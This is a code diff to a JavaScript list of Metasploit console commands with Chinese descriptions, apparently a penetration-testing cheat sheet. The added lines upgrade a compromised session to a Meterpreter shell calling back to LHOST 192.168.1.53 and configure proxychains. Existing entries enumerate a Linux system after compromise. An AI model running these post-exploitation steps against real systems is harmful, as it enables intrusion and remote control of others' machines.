@@ -43,8 +43,6 @@
       { command: 'connect baidu.com 443', description: '“使用connect命令对百度连接-metasploit'},  
       { command: 'exit', description: '“退出控制台（和quit一个意思）-metasploit'}, 
       { command: 'chcp 6500', description: '“修改编码方便更好的显示-metasploit'}, 
-
-
       { command: 'hosts', description: '“展示数据库中的历史信息-metasploit'},
       { command: 'hosts -h', description: '“展示hosts的帮助信息（‘？’也行）-metasploit'},
       { command: 'hosts -d', description: '“删除数据库中对应的主机的信息-metasploit'},
@@ -183,10 +181,22 @@
       //系统枚举渗透测试
       { command: 'use post/linux/gather/enum_system', description: '设置漏洞利用模块-枚举系统渗透测试' },
       { command: 'set sessions 1', description: '设置会话1-枚举系统渗透测试' },
-      { command: 'run', description: '执行枚举-枚举系统渗透测试' }    
+      { command: 'run', description: '执行枚举-枚举系统渗透测试' },
+      //shell_to_meterpreter
+      { command: 'use post/multi/manage/shell_to_meterpreter', description: '设置漏洞利用模块-payload修改' },
+      { command: 'set LHOST 192.168.1.53', description: '设置反弹的IP位置-payload修改' },
+      { command: 'set sessions 1', description: '设置会话1-payload修改' },
+      { command: 'run', description: '执行枚举-payload修改' },
+
+
 
 
       // 其他结果..
+      { command: 'vim /etc/proxychains4.conf', description: 'kali凯丽修改代理配置' }     
+      
+
+      //window10-1909渗透测试  
+      // 其他结果...
     ];
 
     function generateCommands() {
